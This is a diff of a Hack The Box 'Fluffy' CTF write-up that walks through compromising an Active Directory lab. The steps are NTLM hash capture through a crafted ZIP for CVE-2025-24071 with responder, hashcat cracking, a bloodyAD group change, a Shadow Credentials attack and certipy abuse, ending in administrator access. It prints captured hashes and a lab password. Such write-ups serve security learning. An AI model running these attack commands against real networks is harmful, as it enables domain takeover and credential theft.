@@ -25,7 +25,7 @@ Below is the list of open ports on the machine.
 3269 - ssl/LDAP 
 5985 - HTTP
 
-OS : windows_server_2019 - likely DC 
+Windows_server_2019
 ```
 
 SMB signing scan just for practice purpose :)
@@ -75,6 +75,12 @@ INFO: Querying computer: DC01.fluffy.htb
 INFO: Done in 00M 13S
 ```
 
+Start `neo4j` and upload all the data from the previous command output to `Bloodhound` GUI
+
+```bash
+sudo neo4j console 
+```
+
 ![bloodhound1](/Hugo/images/bloodhound1.png)
 
 After running `Bloodhound`, right click on the compromised user (j.fleischman) and click "Add to Owned".
@@ -84,6 +90,7 @@ After running `Bloodhound`, right click on the compromised user (j.fleischman) a
 In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- [`CVE-2025-24071`](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) - Basically it exploits the trust between Windows Explorer and .library-ms file.  Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim's hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.
 
 The exploit : https://www.exploit-db.com/exploits/52310 
+This exploit will generate a specially crafted ZIP file meant to be decompressed by victim.
 
 ```bash
 ┌──(cresp0㉿kali)-[~/Downloads]
@@ -92,18 +99,7 @@ The exploit : https://www.exploit-db.com/exploits/52310
 [+] Created ZIP: output_fluffy/paylod_fluffy.zip
 [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
 ```
-Setup `responder` and upload the zip file to the SMB server
-
-Responder activated : 
-
-```bash
-sudo responder -I tun0 -wvF
-[+] Listening for events...
-
-[SMB] NTLMv2-SSP Client   : 10.10.11.69
-[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
-[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000
-```
+Setup `responder` and upload the ZIP file to the SMB server
 
 ```bash
 smb: \> put paylod_fluffy.zip
@@ -122,7 +118,18 @@ smb: \> ls
 smb: \>
 ```
 
-We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using hashcat.
+Responder activated and successfully captured hash : 
+
+```bash
+sudo responder -I tun0 -wvF
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000
+```
+
+We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using `hashcat`.
 ```bash
 hashcat -m 5600 -a 0 p.agilahash.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -147,7 +154,7 @@ Alternatively, you can write to the “servicePrincipalNames” attribute and pe
 
 
 ## 2.1 Adding ourselves to Service Accounts group
-So right now, we (p.agila) needs to have "access" to the user accounts in the `Service Accounts` group to explore further more. Since p.agila is a member of `Service Account Managers` group which has `GenericAll` perm to the `Service Accounts` group, we can add ourselves to the group to inherit the `GenericWrite` perm on the service accounts.
+So right now, we (p.agila) needs to compromise the critical user accounts in the `Service Accounts` group to explore further more. Since p.agila is a member of `Service Account Managers` group which has `GenericAll` perm to the `Service Accounts` group, we can add ourselves to the group to inherit the `GenericWrite` perm on the service accounts. Use `bloodyAD` tool.
 
 ```bash
 bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
@@ -166,7 +173,11 @@ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.6
 
 ## 2.2 Shadow Credentials attack to retrieve winrm_svc hash
 
-Now we will create Shadow Credentials on one of the service accounts which is `winrm_svc`. Use `pywhisker.py` from [here](https://github.com/ShutdownRepo/pywhisker). To understand more about Shadow Credentials attack.. read it [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password. 
+Now we will create `shadow credentials` on one of the service accounts which is `winrm_svc`. Use `pywhisker.py` from [here](https://github.com/ShutdownRepo/pywhisker). To understand more about Shadow Credentials attack.. read it [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password. 
+
+Please be noted that we can just use `certipy` to do the attack in a single command  but for learning purposes, I'll be using 3 tools that complement each other that serve the same purpose as `certipy`. 
+
+Now, use `pywhisker.py` to add shadow credentials (modifying msds-KeyCredentialLink attribute) and retrieve the certificate.
 
 ```bash
 ──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker]
@@ -196,9 +207,9 @@ Now we will create Shadow Credentials on one of the service accounts which is `w
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
-Run `gettgtpkinit.py` from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache. 
+What happened in the output is the shadow credential is added. The tool also generated key pair, where the public key is wrote onto the attribute and the private key is in the pfx file/certificate. The pfx file is used to authenticate as the account `winrm_svc`.
 
-Now, I want you to take a look at the output, where there is a `AS-REP encryption key`. The tool prints it out because in the next step, the NT hash is retrieved by decrypting the NTLM keys (NT hash-derived keys) from the `PAC_CREDENTIAL_INFO` returned by the KDC.. using the `AS-REP encryption key` itself.
+Now we have the thing needed for authentication. Since the default authentication mechanism in AD is `Kerberos`, we will use the cert to get the TGT. Run `gettgtpkinit.py` from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache. 
 
 ```bash
 ┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools]
@@ -215,7 +226,16 @@ INFO:minikerberos:398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d3
 INFO:minikerberos:Saved TGT to file
 ```
 
-Run `getnthash.py` to retrieve the NT hash of `winrm_svc`. This tool actually does the `TGS-REQ` process using Kerberos U2U.. when someone tries to access a resource using TGT gotten from the KDC. See the image below :
+Now, I want you to take a look at the output, where there is an `AS-REP encryption key`. Let's dive into what exactly that is and where it came from.
+
+Let's go back to how Kerberos works :- remember that Kerberos is password/symmetric while Kerberos + PKINIT is certificate/asymmetric. 
+
+![kerb](/Hugo/images/kerb.jpg)
+![kerb1](/Hugo/images/kerb1.png)
+
+The first step of the mechanism is the user has to authenitcate using his credentials (password etc). whereas in Kerberos PKINIT, the user presents his certificate-privatekey (the one we got from pywhisker.py) to the KDC to confirm his identity. Then in the AS-REP process, there are two things in AS-REP which are TGT and Session Key encrypted by the symmetric key (AS-REP key) generated by the KDC. The key is generated using either two ways which are RSA and DHE. Lastly, the user will decrypt the session key using AS-REP key or the symmetric key. 
+
+Run `getnthash.py` to retrieve the NT hash of `winrm_svc`. This tool actually does the `TGS-REQ` process, which is the first process to request access to a service after we got the TGT from AS-REP process. The image below explains that we (winrm_svc) is essentially request access to ourselves.
 
 ![getnt](/Hugo/images/getnt.png)
 
@@ -428,7 +448,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_svc'
 ```
 
-Perform authentication (certificate-based) using the administrator cert, `Certipy` will get the hash for you.
+Perform authentication using the administrator cert, `Certipy` will get the hash for you.
 
 ```bash
 ┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
@@ -445,6 +465,8 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
+
+Now, you would ask why did i use gettgtpkinit.py and getnthash.py just to get the NT hash after adding shadow credentials. Why don't i use the command above where i just use certipy auth ? It's just for understanding the underlying mechanism and to understand how does these things work.
 
 Lastly, use `evil-winrm` to log in using Admin credentials
 
